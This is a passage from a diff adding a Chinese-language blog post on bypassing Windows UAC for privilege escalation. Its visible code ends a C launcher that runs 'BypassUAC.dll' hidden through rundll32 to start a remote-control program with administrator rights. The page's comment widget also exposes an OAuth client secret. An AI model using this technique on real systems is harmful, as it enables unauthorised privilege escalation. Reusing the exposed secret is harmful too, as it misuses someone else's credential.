+</span><span style="color:#75715e"></span>   (strrchr(pszFileName, <span style="color:#e6db74">&#39;\\&#39;</span>))[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+   <span style="color:#75715e">//拼接要注入dll路径
+</span><span style="color:#75715e"></span>   <span style="color:#66d9ef">char</span> pszDllName[MAX_PATH] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+   sprintf_s(pszDllName, <span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">%s&#34;</span>, pszFileName, <span style="color:#e6db74">&#34;BypassUAC.dll&#34;</span>);
+   sprintf_s(szCmdLine, <span style="color:#e6db74">&#34;%s %s %s&#34;</span>, szRundll32Path, pszDllName, <span style="color:#e6db74">&#34;BypassUAC&#34;</span>);
+   WinExec(szCmdLine, SW_HIDE);
+}
+</code></pre></div><p>运行此Launcher，将以管理员权限打开我们的远控程序。</p>
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="../../images/post/bypassUAC.png" alt="管理员权限执行用户添加" class="lazyload"><figcaption class="image-caption">管理员权限执行用户添加</figcaption></figure></p>
+<p>而没有提权时我们的程序无法执行这个指令。</p>
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="../../images/post/no_UAC.png" alt="正常权限下被拒绝访问" class="lazyload"><figcaption class="image-caption">正常权限下被拒绝访问</figcaption></figure></p>
+</blockquote>
+</blockquote>
+<h4 id="参考文章">参考文章</h4>
+<p>[1] 酷扯儿.Windows编程技术：提权技术(下)[EB/OL].2020-09-22</p>
+<p><a href="https://baijiahao.baidu.com/s?id=1678518589760092233&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1678518589760092233&amp;wfr=spider&amp;for=pc</a></p>
+<p>[2] FDCFDMin.COM（Componet Object Model_组件对象模型）技术概述[EB/OL].2018-09-17</p>
+<p><a href="https://blog.csdn.net/weixin_39743893/article/details/82500563">https://blog.csdn.net/weixin_39743893/article/details/82500563</a></p>
+<p>[3] Microsoft.COM Technical Overview[EB/OL].2018-05-31</p>
+<p><a href="https://docs.microsoft.com/zh-cn/windows/win32/com/com-technical-overview">https://docs.microsoft.com/zh-cn/windows/win32/com/com-technical-overview</a></p>
+<p>[4] 自己的小白.基于COM组件接口ICMLuaUtil的Bypass UAC[EB/OL].2020-04-24</p>
+<p><a href="https://www.cnblogs.com/ndyxb/p/12770289.html">https://www.cnblogs.com/ndyxb/p/12770289.html</a></p>
+<h4 id="本文中使用的远控程序">本文中使用的远控程序</h4>
+<p><a href="https://github.com/SGS4ever/RemoteCtrl">https://github.com/SGS4ever/RemoteCtrl</a></p>
+
+    </div>
+
+    <div class="post-copyright">
+             
+            <p class="copyright-item">
+                <span>Author: </span>
+                <span>XR_G </span>
+                </p>
+            
+           
+            <p class="copyright-item">
+                    <span>Words: </span>
+                   <span>591</span>
+            </p>
+            
+            <p class="copyright-item">
+                
+                <span>Share: </span>
+                <span>
+
+      
+        <a href="//twitter.com/share?url=https%3a%2f%2fSGS4ever.github.io%2f2020%2f%25E6%258F%2590%25E6%259D%2583%25E6%258A%2580%25E6%259C%25AF-%25E7%25BB%2595%25E8%25BF%2587uac%2f&amp;text=%e6%8f%90%e6%9d%83%e6%8a%80%e6%9c%af--%e7%bb%95%e8%bf%87UAC&amp;via=HuangruiLee" target="_blank" title="Share on Twitter">
+          <i class="iconfont icon-twitter"></i>
+        </a>
+        
+      
+      
+      
+      
+      
+      
+      
+      
+        
+      
+        
+      
+
+          
+
+          
+
+          
+
+          
+        <a href="//service.weibo.com/share/share.php?url=https%3a%2f%2fSGS4ever.github.io%2f2020%2f%25E6%258F%2590%25E6%259D%2583%25E6%258A%2580%25E6%259C%25AF-%25E7%25BB%2595%25E8%25BF%2587uac%2f&amp;appkey=&amp;title=%e6%8f%90%e6%9d%83%e6%8a%80%e6%9c%af--%e7%bb%95%e8%bf%87UAC" target="_blank" title="Share on Douban ">
+            <i class="iconfont icon-weibo"></i>
+          </a>
+          
+</span>
+                
+            </p>
+
+            
+    </div>
+
+  
+    <div class="post-tags">
+        
+            <section>
+            <i class="iconfont icon-icon-tag"></i>Tag: 
+            
+            <span class="tag"><a href="https://SGS4ever.github.io/tags/%E6%8A%80%E6%9C%AF/">
+                    #技术</a></span>
+            
+            <span class="tag"><a href="https://SGS4ever.github.io/tags/%E5%AE%89%E5%85%A8/">
+                    #安全</a></span>
+            
+            </section>
+        
+        <section>
+                <a href="javascript:window.history.back();">Back</a></span> · 
+                <span><a href="https://SGS4ever.github.io">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+        
+        <a href="https://SGS4ever.github.io/2020/%E6%A1%8C%E9%9D%A2%E7%BE%8E%E5%8C%96%E6%96%B9%E6%A1%88-rainmeter/" class="prev" rel="prev" title="桌面美化方案-Rainmeter"><i class="iconfont icon-dajiantou"></i>&nbsp;桌面美化方案-Rainmeter</a>
+         
+        
+    </div>
+
+    <div class="post-comment">
+          
+          
+
+      <div id="gitalk-container"></div>
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css" crossorigin="anonymous">
+      <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js" crossorigin="anonymous"></script>
+      <script type="text/javascript">
+          var gitalk = new Gitalk({
+              id: '2020-12-21 00:00:00 \u002b0000 UTC',
+              title: '提权技术--绕过UAC',
+              clientID: '60cf432a89bc92763c12',
+              clientSecret: '58a643e9afb7d2b630c9c8ca5909f7d231b4f9d6',
+              repo: 'BlogComments',
+              owner: 'SGS4ever',
+              admin: ['SGS4ever'],
+              body: decodeURI(location.href)
+          });
+          gitalk.render('gitalk-container');
+      </script>
+      <noscript>Please enable JavaScript to view the <a href="https://github.com/gitalk/gitalk">comments powered by gitalk.</a></noscript>
+
+ 
+
+          
+    </div>
+</article>
+          </div>
+       </main>
+      <footer class="footer">
+    <div class="copyright">
+        &copy;
+        
+        <span itemprop="copyrightYear">2020 - 2020</span>
+        
+         
+            <span class="author" itemprop="copyrightHolder"><a href="https://SGS4ever.github.io">XR_G</a> | </span>
+         
+
+		  <span>Crafted with ❤️ by <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="external nofollow noopener noreffer">KeepIt</a> & <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreffer">Hugo</a></span>
+    </div>
+</footer>
+
+
+
+
+
+
+
+
+
+
+
+    
+    <link crossorigin="anonymous" integrity="sha384-yziQACfvCVwLqVFLqkWBYRO3XeA4EqzfXKGwaWnenYn5XzqfJFlFdKEmvutIQdKb" href="https://lib.baomitu.com/lightgallery/1.6.12/css/lightgallery.min.css" rel="stylesheet">
+      
+     <script src="/js/vendor_gallery.min.js" async="" ></script>
+    
+  
+
+
+
+
+
+
+
+     </div>
+  </body>
+</html>
